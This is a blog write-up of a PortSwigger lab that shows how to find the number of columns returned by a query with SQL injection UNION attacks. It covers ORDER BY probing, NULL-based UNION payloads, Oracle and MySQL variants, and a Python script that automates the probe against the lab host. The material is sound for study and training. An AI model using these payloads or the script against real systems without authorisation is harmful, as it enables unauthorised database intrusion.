---
layout: post
title: "SQLi UNION attack, determining the number of columns returned by the query"
date: 2023-05-29
categories:
  - CTF
  - PortSwigger
tags:
  - SQLi
---

## SQL Injection Union attacks

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

## Description

This [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns){:target="_blank"} contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks){:target="_blank"} attack that returns an additional row containing null values.

## Steps

First, we need to determine the number of columns returned by the query. Let's intercept the HTTP request when we filter on `Gifts` category and attempt a union SQL injection.

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-03.png">

Checking with a single quote (`'`) reveals that the application is vulnerable.

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-04.png">

Order by 1, 2, and 3 doesn't fail, but order by 4 fails, indicating that the query has only 3 columns.

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-05.png">

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-06.png">

Knowing that we have 3 columns, let's replace the ORDER BY 3 with `' UNION SELECT NULL,NULL,NULL` in order to solve the lab.

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-07.png">

Now, let's automate the attack using a Python script.

```python
import requests  
import sys  
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
  
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}  
  
if __name__ == "__main__":  
  try:  
    url = sys.argv[1].strip()  
  except IndexError:  
    print("Usage: %s <url>, e.g www.example.com" % sys.argv[0])  
    sys.exit(-1)  

  path = "/filter?category=Gifts"  
  payload = "'+UNION+SELECT+NULL--" 

  for i in range(1, 10):  
    if i > 1:  
      payload = payload.replace('--', ',NULL--')    
    r = requests.get(url + path + payload, verify=False, proxies=proxies)  
    res = r.text  
    if "Internal Server Error" not in res:  
      print("The number of columns is " + str(i))  
      sys.exit(-1)  

  print("The SQLi attack was not successful, maybe the query returns more than 10 columns?")
```

Executing the above script returns an answer of 3 columns, consistent with what we observed in the manual test. Great!

```powershell
python3 sqli-lab03.py "https://0a110012045284bc8477151900160025.web-security-academy.net"

The number of columns is 3
```

And we can confirm from Burp HTTP History that the SQL error no longer appears when we have 3 columns.

<img src="https://jawad.ca/images/sqli-lab03/sqli-lab03-08.png">

## Notes
- On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
	 `' UNION SELECT NULL FROM DUAL--`
- The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment

